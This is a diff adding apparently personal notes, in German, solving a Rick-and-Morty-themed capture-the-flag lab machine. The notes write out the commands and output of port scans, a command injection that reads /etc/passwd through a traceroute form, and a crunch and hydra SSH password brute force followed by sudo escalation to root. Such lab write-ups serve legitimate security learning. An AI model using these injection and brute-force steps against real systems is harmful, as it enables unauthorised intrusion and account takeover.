@@ -1,0 +1,103 @@
+ENUM:
+	Portscan: nmap -v 192.168.56.100-120
+		host: 192.168.56.102		
+		open ports: 21/tcp (ftp), 22/tcp (ssh), 80/tcp (http), 9090/tcp (zeus-admin)
+
+	UDP Ports konnten nicht alleine gefunden werden -> 13337, 22222, 60000 gemäss Walkthrough
+	(nmap -v -p- 192.168.56.102 wäre die Lösung gewesen)
+		nc 192.168.56.102 13337  ->  FLAG:{TheyFoundMyBackDoorMorty}-10Points
+		nc 192.168.56.102 22222  ->  SSH-2.0-OpenSSH_7.5  ???
+		nc 192.168.56.102 60000  ->  Welcome to Ricks half baked reverse shell...
+			# whoami -> root
+			# pwd -> /root/blackhole/
+			# ls -lsa -> FLAG{Flip the pickle Morty!} - 10 Points
+			# cd ..  ->  Permission Denied. Denied sonst nicht gross geschrieben, cd triggert Nachricht...
+
+Website:
+	/robots.txt:
+		They're Robots Morty! It's ok to shoot them! They're just Robots!
+
+		/cgi-bin/root_shell.cgi
+		/cgi-bin/tracertool.cgi
+		/cgi-bin/*
+
+	/cgi-bin/root_shell.cgi  :  bummer
+	/cgi-bin/tracertool.cgi  :  MORTY'S MACHINE TRACER MACHINE (Enter an IP address to trace.)
+		traceroute Befehl, Command Injection (192.168.56.102; cat /etc/passwd)
+
+		 cat Befehl gesperrt:    _
+		                        | \
+		                        | |
+		                        | |
+		   |\                   | |
+		  /, ~\                / /
+		 X     `-.....-------./ /
+		  ~-. ~  ~              |
+		     \             /    |
+		      \  /_     ___\   /
+		      | /\ ~~~~~   \  |
+		      | | \        || |
+		      | |\ \       || )
+		     (_/ (_/      ((_/      ... darum more Befehl
+
+	192.168.56.102; more /etc/passwd
+		tcpdump:x:72:72::/:/sbin/nologin
+		RickSanchez:x:1000:1000::/home/RickSanchez:/bin/bash
+		Morty:x:1001:1001::/home/Morty:/bin/bash
+		Summer:x:1002:1002::/home/Summer:/bin/bash
+		apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+
+	Dirbuster: dirb http://192.168.56.102/ /usr/share/dirb/wordlists/big.txt
+		http://192.168.56.102/cgi-bin/  CODE: 403
+		http://192.168.56.102/passwords/ CODE: 200
+	
+	/passwords/  :  FLAG{Yeah d- just don't do it.} - 10 Points
+
+	/passwords/passwords.html  :  <!-- Password: winter -->
+
+Server:  Login: Summer  Password: winter
+		FLAG{Get off the high road Summer!} - 10 Points
+		cd /home; ls -> Morty   RickSanchez   Summer
+
+		cd Morty ->  journal.txt.zip   Safe_Password.jpg
+		more Safe_Password.jpg ->  Password: Meeseek
+		unzip journal.txt.zip -> journal.txt mit PW: Meeseek -> cannot create journal.txt, permission denied
+		cp journal.txt.zip /home/Summer/journal.txt.zip  ->  unzip journal.txt.zip mit PW: Meeseek
+		FLAG{131333} - 20 points
+
+		cd RickSanchez ->  RICKS_SAFE  ThisDoesntContainAnyFlags  (beides Ordner)
+		cd ThisDoesntContainAnyFlags -> NotAFlag.txt  ...wirklich keine Flag
+		cd RICKS_SAFE ->  safe (executable) -> ./safe -> permission denied
+		cp safe /home/Summer -> ./safe ->  use command line arguments
+		./safe 1313333 -> FLAG{And Awaaaayyyy we Go!} - 20 points
+		Hints für das Passwort: 1 uppercase, 1 digit, 1 word from Ricks former band
+
+		locate ftp -> /var/ftp -> cd /var/ftp
+		FLAG{Whoa this is unexpected} - 10 points
+
+Zeus:  Portscan zeigt offenen Port 9090 mit zeus-admin
+	Browser: 192.168.56.102:9090 ->  https://192.168.56.102:9090
+	FLAG{THERE IS NO ZEUS, IN YOUR FACE!} - 10 points
+
+Ricks Passwort: 1 uppercase character, 1 digit, 1 word from his old band name (Flesh Curtains)
+		crunch für Wordlist, hydra für Bruteforce
+
+crunch:		crunch <min-len> <max-len> [<charset string>] [options]
+		-t ,%Flesh    oder    -t ,%Curtains
+		-o flesh_wl.txt  oder -o curtains_wl.txt
+		crunch 7 7 -t ,%Flesh -o flesh_wl.txt
+		crunch 10 10 -t ,%Curtains -o curtains_wl.txt
+
+hydra:		hydra 192.168.56.102 ssh -s 22222 -f -v -l RickSanchez -P /home/hacker/rickvm/flesh_wl.txt
+		hydra 192.168.56.102 ssh -s 22222 -f -v -l RickSanchez -P /home/hacker/rickvm/curtains_wl.txt
+		[22222][ssh] host: 192.168.56.102 login: RickSanchez password: P7Curtains
+		ssh RickSanchez@192.168.56.102 -p 22222
+
+RickSanchez:	id -> uid=1000(RickSanchez) gid=1000(RickSanchez) groups=10(wheel)
+		sudo whoami -> [sudo] password for RickSanchez: P7Curtains -> root !
+		sudo su root  -> root@localhost/RickSanchez !
+		cd /root; ls -lsa -> anaconda-ks.cfg FLAG.txt
+		
+		FLAG{Ionic Defibrillator} - 30 points
+
+Points: 130 / 130
